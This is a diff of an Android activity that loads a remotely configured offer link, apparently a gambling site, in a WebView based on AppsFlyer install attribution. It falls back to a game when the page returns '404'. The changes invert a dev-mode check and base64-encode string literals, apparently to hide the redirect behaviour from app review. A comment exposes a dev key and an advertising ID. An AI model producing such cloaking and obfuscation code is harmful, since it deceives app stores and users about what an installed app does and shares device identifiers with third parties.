@@ -1,8 +1,7 @@
 package com.etgpy.rsiech;
 
 import static com.etgpy.rsiech.ApplicationClass.appsFlyerId;
-import static com.etgpy.rsiech.Constants.GIST_LINK;
-import static com.etgpy.rsiech.Constants.devKEyDice;
+import static com.etgpy.rsiech.ApplicationClass.appsFlyerLoaded;
 import static com.etgpy.rsiech.FaceBook.strDeep;
 
 import android.app.Activity;
@@ -12,13 +11,14 @@ import android.content.SharedPreferences;
 import android.graphics.Bitmap;
 import android.net.Uri;
 import android.os.Bundle;
-import android.os.Handler;
 import android.util.Log;
+import android.view.View;
 import android.webkit.ValueCallback;
 import android.webkit.WebChromeClient;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
+import android.widget.ProgressBar;
 
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
@@ -42,7 +42,7 @@ public class ER extends AppCompatActivity {
     private String keyDefault;
     private String offer;
     private String fbId;
-    public static final String PREFERENCES_URL = "LAST_WebView_URL";
+    public static final String PREFERENCES_URL = "TEFTVF9XZWJWaWV3X1VSTA==";
     public static final int INPUT_FILE_REQUEST_CODE = 1;
     public static String statusAppsFlyer;
     public static String  strAppsFlyer;
@@ -51,14 +51,17 @@ public class ER extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        ProgressBar progressBar = (ProgressBar) findViewById(R.id.progressBar);
+        progressBar.setVisibility(ProgressBar.VISIBLE);
 
-        if (! ifDevMode()) {
-            setContentView(R.layout.activity_main);
+        if (ifDevMode()) {
+
             webView = findViewById(R.id.webView);
             setWebView(webView);
 
             Retrofit retrofit = new Retrofit.Builder()
-                    .baseUrl(GIST_LINK)
+                    .baseUrl(Constants.GIST_LINK)
                     .build();
             GistApi gistApi = retrofit.create(GistApi.class);
             Call<ResponseBody> gistQuery = gistApi.getStringUrl();
@@ -76,23 +79,18 @@ public class ER extends AppCompatActivity {
 
                             new FaceBook(fbId, ER.this);
 
-                            sPrefs = getSharedPreferences("myWebViewPrefs", Context.MODE_PRIVATE);
+                            sPrefs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
                             link = sPrefs.getString(PREFERENCES_URL, null);
 
-
-                            // TODO
-
                             if (link != null) {
+                                webView.setVisibility(View.VISIBLE);
                                 webView.loadUrl(link);
+                                webView.setVisibility(View.VISIBLE);
+                                progressBar.setVisibility(ProgressBar.INVISIBLE);
                             } else {
-
-                                new Handler().postDelayed(new Runnable() {
-                                    @Override
-                                    public void run() {
                                         startWebView(offer);
-                                    }
-                                }, 5000);
-
+                                        webView.setVisibility(View.VISIBLE);
+                                        progressBar.setVisibility(ProgressBar.INVISIBLE);
                             }
 
                         } catch (IOException e) {
@@ -122,8 +120,11 @@ public class ER extends AppCompatActivity {
     }
 
     void startWebView(String link) {
+        do {} while (!appsFlyerLoaded);
+
         if (statusAppsFlyer.equals("Non-organic")) {
             String url = link + strAppsFlyer;
+
             Log.i("MyApp", "Non-organic:" + url);
             webView.loadUrl(url);
         } else if (strDeep != null) {
@@ -138,10 +139,11 @@ public class ER extends AppCompatActivity {
             } else {
                 //органика включена
                 strAppsFlyer =
-                        keyDefault + "?bundle=" + getPackageName()
-                                + "&ad_id=" + FaceBook.AID
-                                + "&apps_id=" + appsFlyerId
-                                + "&dev_key=" + devKEyDice;
+                        keyDefault
+                                + Constants.decode("P2J1bmRsZT0=") + getPackageName()
+                                + Constants.decode("JmFkX2lkPQ==") + FaceBook.AID
+                                + Constants.decode("JmFwcHNfaWQ9") + appsFlyerId
+                                + Constants.decode("JmRldl9rZXk9") + Constants.decode(Constants.devKEyDice);
                 String url = link + strAppsFlyer;
                 Log.i("MyApp", "Organic:" + url);
                 //E/User: Organic: https://gigaspin.xyz/Gp88Vp?bundle=com.fferss.fullapp&ad_id=590ec99f-f3df-4f93-9bd9-07e82d8f79e4&apps_id=1641395442394-6992958082334891642&dev_key=jhmwSMVcuZWmhQ3nVyj5S4
@@ -213,7 +215,7 @@ public class ER extends AppCompatActivity {
             myFilePathCallback = filePathCallback;
             Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
             contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
-            contentSelectionIntent.setType("image/*");
+            contentSelectionIntent.setType(Constants.decode("aW1hZ2UvKg=="));
             Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
             chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
             startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODE);
@@ -225,7 +227,7 @@ public class ER extends AppCompatActivity {
         @Override
         public void onPageStarted(WebView view, String url, Bitmap favicon) {
             super.onPageStarted(view, url, favicon);
-            if (url.startsWith("404")) {
+            if (url.contains(Constants.decode("NDA0"))) {
                 goToGame();
                 finish();
             }
